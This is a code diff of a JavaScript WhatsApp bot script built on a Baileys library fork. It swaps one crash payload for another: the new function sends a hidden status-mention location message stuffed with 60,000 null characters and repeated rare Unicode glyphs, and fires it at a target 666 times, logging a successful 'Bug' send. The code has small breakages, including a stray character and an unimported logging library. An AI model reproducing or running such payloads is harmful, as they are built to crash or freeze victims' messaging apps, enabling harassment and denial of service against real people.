@@ -1,82 +1,95 @@
-const { default: makeWASocket, proto, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
-const pino = require('pino');
-const crypto = require('crypto');
-
-// Declaração da função sleep
-const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-
-async function IosInvisible(sock, target) {
-    if (!sock || !target) {
-        console.log('[IosInvisible] missing sock or target');
-        return;
-    }
-
-    // ---- Sender guard ----
-    // Never let the paired number target itself.
-    try {
-        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
-        const senderNum = senderRaw.split('@')[0].split(':')[0];
-        const targetNum = String(target).split('@')[0].split(':')[0];
-        if (senderNum && targetNum && senderNum === targetNum) {
-            console.log('[IosInvisible] skipped — target equals sender (' + senderNum + ')');
-            return;
+async function TrashLocIoSInVis(sock, target) {
+  const x = 60000;
+  const locationMessage = {
+    locationMessage: {
+      degreesLatitude: 21.1266,
+      degreesLongitude: -11.8199,
+      name: " #4izxvelzExerc1st. " 
+      + "\u0000".repeat(x) 
+      + "𑇂𑆵𑆴𑆿".repeat(x),
+      address: "https://t.me/rizxvelzexct",
+      contextInfo: {
+        externalAdReply: {
+          title: "𑇂𑆵𑆴𑆿".repeat(x),
+          body: "𑇂𑆵𑆴𑆿".repeat(x),
+          mediaType: 1,
+          thumbnailUrl: "https://example.com/thumb.jpg",
+          sourceUrl: "https://t.me/rizxvelzexct",
+          mediaUrl: "https://example.com/media.jpg"
         }
-    } catch (_) {
-        // fall through
+      }
     }
+  };
 
-    try {
-        await sock.relayMessage('status@broadcast', {
-            botForwardedMessage: {
-                message: {
-                    richResponseMessage: {
-                        messageType: 1,
-                        submessages: [],
-                        unifiedResponse: {
-                            data: Buffer.from(JSON.stringify({
-                                response_id: crypto.randomUUID(),
-                                sections: [
-                                    {
-                                        view_model: {
-                                            primitive: {
-                                                text: "lixo",
-                                                inline_entities: ["{".repeat(50000)],
-                                                __typename: "GenAIMarkdownTextUXPrimitive"
-                                            },
-                                            __typename: "GenAISingleLayoutViewModel"
-                                        }
-                                    }
-                                ]
-                            }))
-                        },
-                        contextInfo: {
-                            forwardingScore: 1,
-                            isForwarded: true,
-                            forwardOrigin: 4,
-                            forwardedAiBotMessageInfo: {
-                                botJid: "0@bot"
-                            }
-                        }
-                    }
-                }
-            }
-        }, {
-            statusJidList: [target],
-            additionalNodes: [{
-                tag: 'meta',
+  try {
+    const msg = await generateWAMessageFromContent("status@broadcast", {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 2
+            },
+            locationMessage: locationMessage.locationMessage
+          }
+        }
+      },
+      {}
+    );
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {},
+            content: [
+              {
+                tag: "mentioned_users",
                 attrs: {},
-                content: [{
-                    tag: 'mentioned_users',
-                    attrs: {},
-                    content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
-                }]
-            }]
-        });
-    } catch (e) {
-        console.log('[IosInvisible]', (e && e.message) ? e.message : e);
-    }
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target },
+                    content: undefined
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
 
-    await sleep(1000);
+    await sock.relayMessage(target, {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { is_status_mention: "#Location?-💰" },
+            content: undefined
+          }
+        ]
+      }
+    );
+
+    console.log(chalk.green("Success Send Bug Location To Status By Syonx£hiro"));
+  } catch (error) {
+    console.error("Error sending message:", error);
+  }
+}i
+
+// <<( The Calling Function )>>
+for (let r = 0; r < 666; r++) {
+await TrashLocIoSInVis(sock, target)
+await new Promise(resolve => setTimeout(resolve, 2000));
 }
-
-module.exports = { IosInvisible };
